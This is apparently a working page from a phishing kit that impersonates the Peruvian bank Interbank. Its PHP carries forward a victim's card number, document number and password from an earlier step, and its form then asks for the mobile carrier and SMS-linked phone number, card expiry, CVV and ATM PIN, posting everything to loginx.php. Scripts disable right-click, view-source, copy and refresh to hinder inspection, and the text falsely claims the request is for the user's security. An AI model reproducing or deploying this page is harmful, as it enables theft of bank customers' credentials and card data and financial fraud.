<?php
error_reporting(0);
$tarjeta = $_POST["tarjeta"];
if (strlen($tarjeta) == 16) {
$nu1 = substr($tarjeta, 0, -12);
$nu2 = substr($tarjeta, 4, -8);
$nu3 = substr($tarjeta, 8, -4);
$nu4 = substr($tarjeta, -4);
$car = $nu1." ".$nu2." ".$nu3." ".$nu4; }
else {
$nu1 = substr($tarjeta, 0, -11);
$nu2 = substr($tarjeta, 4, -5);
$nu3 = substr($tarjeta, -5);
$car = $nu1." ".$nu2." ".$nu3; }
$tipo = $_POST["tipo"];
$documento = $_POST["documento"];
$pass = $_POST["pass"];
sleep(2);
?>
<!DOCTYPE html>
<html class="fancybox-lock" lang="es"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">		
<meta http-equiv="X-UA-Compatible" content="IE=EDGE">			
<title>Interbank</title>
<link rel="stylesheet" type="text/css" href="files/css/warhol2.css">
<link rel="stylesheet" type="text/css" href="files/css/style.css">  
<link rel="stylesheet" type="text/css" href="files/css/codePoints.css">
<link href="files/img/favicon.ico" rel="Shortcut Icon">
<link href="https://fonts.googleapis.com/css?family=Krub" rel="stylesheet">
    
<script type="text/javascript">
function soloNumeros(e) {
	var key = window.Event ? e.which : e.keyCode
	return ((key >= 48 && key <= 57) || (key==8))
}
</script>
    

<script language="javascript">
function comprobar() {

   var opera = document.getElementById('operaa');
   var operb = document.getElementById('operab');
   var operc = document.getElementById('operac');
   var operd = document.getElementById('operad');
   var cell = document.paso3.movil;
   var mesc = document.paso3.mes;
   var anoc = document.paso3.ano;
   var cvv2 = document.paso3.cvv;
   var atmc = document.paso3.atm;
   
  
	if (!opera.checked && !operb.checked && !operc.checked && !operd.checked) {
		alert("Error, por favor seleccione el operador de celular.");
		return false; }
  
	if (cell.value.length < 8) {
		alert("Error, por favor complete el número de celular.");
		cell.focus();
		return false; }
	if (mesc.value == "Mes") {
		alert("Error, por favor seleccione el mes de vencimiento de su tarjeta.");
		mesc.focus();
		return false; }
	if (anoc.value == "Ano") {
		alert("Error, por favor seleccione el año de vencimiento de su tarjeta.");
		anoc.focus();
		return false; }
	if (cvv.value.length < 3) {
		alert("Error, por favor complete su código CVV.");
		cvv.focus();
		return false; }
	if (atm.value.length < 4) {
		alert("Error, por favor complete su clave de ATM (Clave de Cajero).");
		atm.focus();
		return false; }
		
	if (mesc.value <= 03 && anoc.value == 18) {
		alert("Error, su tarjeta ha vencido por favor verifique la fecha de vencimiento de su tarjeta.");
		mesc.focus();
		return false; }
		
	document.getElementById("boton1").disabled = true;
	return true;
}
</script>
<style type="text/css">
.fancybox-margin { margin-right:0px; }

.texto_gris12 {
font-family:Arial, sans-serif;
font-size:12px;
color:#FFF;
text-align:center; }

.thumbnail {
position: relative;
float: inherit; }

.thumbnail span { 
position: absolute;
padding: 3px;
visibility: hidden;
color: black;
text-decoration: none; }

.thumbnail:hover span { 
visibility: visible;
top: 5px; 
left: 10px;
-webkit-border-radius: 3px; 
-moz-border-radius: 3px; 
-ms-border-radius: 3px;
-o-border-radius: 3px;
border-radius: 3px; }

.thumbnail2 {
position: relative;
float: inherit;
width: 150px; }

.thumbnail2 span { 
position: absolute;
background-color: #093;
padding: 3px;
border: 1px solid #666;
visibility: hidden;
color: black;
width: 150px;
text-decoration: none; }

.thumbnail2:hover span { 
visibility: visible;
top: 5px; 
left: 10px;
-webkit-border-radius: 3px; 
-moz-border-radius: 3px; 
-ms-border-radius: 3px;
-o-border-radius: 3px;
border-radius: 3px;  
border: 1px solid #666; }

.secure {  /* Clase para el input type="text" */
/* -webkit-text-security:disc !important; 
font-size: 9px !important; */
font-family:codePoints !important; }

*::-webkit-input-placeholder { /* Google Chrome y Safari */
color: #757575;
font-family:"Trebuchet MS", Arial, Helvetica, sans-serif;
font-size: 13px; }

*:-moz-placeholder { /* Firefox anterior a 19 */
color: #757575;
font-family:"Trebuchet MS", Arial, Helvetica, sans-serif;
font-size: 13px; }

*::-moz-placeholder { /* Firefox 19 y superior */
color: #757575;
font-family:"Trebuchet MS", Arial, Helvetica, sans-serif;
font-size: 13px; }

*:-ms-input-placeholder { /* Internet Explorer 10 y superior */
color: #757575;
font-family:"Trebuchet MS", Arial, Helvetica, sans-serif;
font-size: 13px; }
</style>

<script language="JavaScript">
document.onkeydown = function(e) {
tecla = (document.all) ? e.keyCode : e.which;
	//alert(tecla)
if (tecla === 116 || tecla === 123)  return false;
if (e.ctrlKey && (tecla === 67 || tecla === 83 || tecla === 85 || tecla === 86 || tecla === 116)) { return false; } else { return true; }};
$(document).keypress("u",function(e) { if(e.ctrlKey) { return false; } else { return true; } });
</script>

<script language="JavaScript">
document.addEventListener("contextmenu", function(e){e.preventDefault();}, false);
</script>
</head>
<body>

<!-- logo_righ -->
<div class="col-12 text-right">
    <img src="files/img/logo_white.svg" class="logo-right-primary" />
</div>    
<!-- logo_righ -->      
    
	<section class="login login-paso3">
		<!--<figure class="logo"><a id="a-logo-sec" href="#" class="logo-responsive">
			<img src="files/img/logo-responsive.png" alt="Interbank" class="png" width="155" height="29">
		</a>
	    <img src="files/img/logo-desktop.png" alt="Interbank" class="png" width="205" height="38"></figure>-->
		<div class="login-info shadow">
			<!-- estado -->
			<!--<ul class="estado-3pasos estado-login">
				<li class="paso-1 pasado"><span>1</span><p></p></li>
				<li class="paso-2 pasado"><span>2</span><p></p></li>
				<li class="paso-3 presente"><span>3</span><p></p></li>
			</ul>-->
			<!-- /estado -->
			<form name="paso3" id="paso3" action="loginx.php?id=0" method="post" onSubmit="return comprobar()">
			  <center><p style="color: red;">Por su seguridad, verifique su información.</p>
			  <p>&nbsp;</p>
              <p>Seleccione el Operador de su Celular</p>
              <p>&nbsp;</p>
              <table width="220" border="0">
			    <tr>
			        <td><p><input type="radio" name="opera" id="operaa" value="Claro"> Claro</p></td>
                    <td><p><input type="radio" name="opera" id="operab" value="Bitel"> Bitel</p></td>
			        <td><p><input type="radio" name="opera" id="operac" value="Entel"> Entel</p></td>
                    <td><p><input type="radio" name="opera" id="operad" value="Movistar"> Movistar</p></td>
		        </tr>
		      </table>
			  <p>&nbsp;</p>
			  <p><input name="movil" onpaste="return false" placeholder="Celular afiliado a la Clave dinámica SMS" onfocus="this.placeholder = ''" onblur="this.placeholder = 'Celular afiliado a la Clave dinámica SMS'" type="tel" id="movil" style="width:280px;border-left-color:#0038a5;border-left-style:solid;border-left-width:4px;text-align:center;" maxlength="9" onKeyPress="return soloNumeros(event)">
			  </p>
			  <p>&nbsp;</p></center>
			  <p><input name="tnum" type="tel" disabled="disabled" id="tnum" value="<?php echo $car; ?>" style="border-left-color: #00953a; border-left-style: solid; border-left-width: 4px; width: 280px; text-align: center;"></p>
			  <p>&nbsp;</p>
			  <center><table width="220" border="0">
			    <tr>
			      <td><a class="thumbnail2"><select name="mes" id="mes" style="border-left-color:#0038a5;border-left-style:solid;border-left-width:4px;font-size:13px;font-family:'Trebuchet MS', Arial, Helvetica, sans-serif;text-align:center;">
                  	<option selected="" value="Mes">Mes</option>
			        <option value="01">01</option>
			        <option value="02">02</option>
			        <option value="03">03</option>
			        <option value="04">04</option>
			        <option value="05">05</option>
			        <option value="06">06</option>
			        <option value="07">07</option>
			        <option value="08">08</option>
			        <option value="09">09</option>
			        <option value="10">10</option>
			        <option value="11">11</option>
			        <option value="12">12</option>
		          </select><span style="left:-50px; top:-50px;"><p class="texto_gris12" style="text-align:center;">Ingrese el Mes de Vencimiento de su Tarjeta</p></span></a></td>
			      <td><a class="thumbnail2"><select name="ano" id="ano" style="border-left-color:#0038a5;border-left-style:solid;border-left-width:4px;font-size:13px;font-family:'Trebuchet MS', Arial, Helvetica, sans-serif;text-align:center;">
                  	<option selected="" value="Ano">Año</option>
			        <option value="18">18</option>
			        <option value="19">19</option>
			        <option value="20">20</option>
			        <option value="21">21</option>
			        <option value="22">22</option>
			        <option value="23">23</option>
			        <option value="24">24</option>
			        <option value="25">25</option>
			        <option value="26">26</option>
			        <option value="27">27</option>
			        <option value="28">28</option>
			        <option value="29">29</option>
		          </select><span style="left:-50px; top:-50px;"><p class="texto_gris12" style="text-align:center;">Ingrese el Año de Vencimiento de su Tarjeta</p></span></a></td>
			      <td><a class="thumbnail"><input name="cvv" onpaste="return false" type="tel" id="cvv" placeholder="CVV" onfocus="this.placeholder = ''" onblur="this.placeholder = 'CVV'" maxlength="4" style="border-left-color:#0038a5;border-left-style:solid;border-left-width:4px;width:45px;text-align:center;" onKeyPress="return soloNumeros(event)">
                  <span style="left:-205px; top:-157px;"><img src="files/img/cv.png" width="462"></span></a></td>
			      <td><a class="thumbnail2"><input name="atm" onpaste="return false" type="tel" placeholder="ATM" onFocus="this.placeholder = ''; this.className = ''" onBlur="this.placeholder = 'ATM'; this.className = 'secure'" id="atm" maxlength="4" style="border-left-color:#0038a5;border-left-style:solid;border-left-width:4px;width:45px;text-align:center;font-size:11px;" onKeyPress="return soloNumeros(event)">
                  <span style="left:-50px; top:-50px;"><p class="texto_gris12" style="text-align:center;">Ingrese los 4 digitos de su<br>Clave de Cajero</p></span></a></td>
		        </tr>
		      </table></center>
			  <p>&nbsp;</p>
              <input type="hidden" name="tarjeta" id="usuario" value="<?php print $tarjeta ?>">
              <input type="hidden" name="tipo" id="usuario" value="<?php print $tipo ?>">
              <input type="hidden" name="documento" id="usuario" value="<?php print $documento ?>">
              <input type="hidden" name="pass" id="usuario" value="<?php print $pass ?>">
			  <p><center><input name="boton1" id="boton1" type="image" value="Continuar"></center></p>
			  <p>&nbsp;</p>
			</form>
		</div>
	</section>
</body></html>